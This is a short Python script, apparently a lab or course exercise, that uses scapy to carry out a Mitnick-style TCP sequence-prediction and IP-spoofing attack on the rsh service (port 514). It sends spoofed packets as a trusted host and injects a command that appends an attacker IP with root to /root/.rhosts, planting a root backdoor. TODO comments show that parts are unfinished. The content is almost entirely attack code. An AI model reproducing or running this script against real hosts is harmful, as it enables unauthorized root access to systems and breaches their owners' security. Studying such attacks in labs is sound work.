from scapy.all import *

import sys
from random import randint

if __name__ == "__main__":
	conf.iface = sys.argv[1]
	target_ip = sys.argv[2]
	trusted_host_ip = sys.argv[3]

	my_ip = get_if_addr(sys.argv[1])

	#TODO: figure out SYN sequence number pattern
	sourcePort = randint(512, 1023)
	targetSyn = sr1(IP(src=my_ip, dst=target_ip) / TCP(sport=sourcePort, dport=514, seq=0, ack=0, flags="S"), verbose=False)
	targetFin = send(IP(src=my_ip, dst=target_ip) / TCP(sport=sourcePort, dport=514, seq=targetSyn[TCP].ack, ack=targetSyn[TCP].seq+1, flags="FA"), verbose=False)
	
	#TODO: TCP hijacking with predicted sequence number
	trustSyn = send(IP(src=trusted_host_ip, dst=target_ip) / TCP(sport=sourcePort, dport=514, seq=0, ack=0, flags="S"), verbose=False)
	fakeAck = send(IP(src=trusted_host_ip, dst=target_ip) / TCP(sport=sourcePort, dport=514, seq=targetSyn[TCP].ack, ack=targetSyn[TCP].seq+1+64000, flags="PA") / Raw(load=str.encode("\x00")), verbose=False)
	command = send(IP(src=trusted_host_ip, dst=target_ip) / TCP(sport=sourcePort, dport=514, seq=targetSyn[TCP].ack+1, ack=targetSyn[TCP].seq+1+64000, flags="PA") / Raw(load="root\x00root\x00echo '10.4.22.237 root' >> /root/.rhosts\x00"), verbose=False)
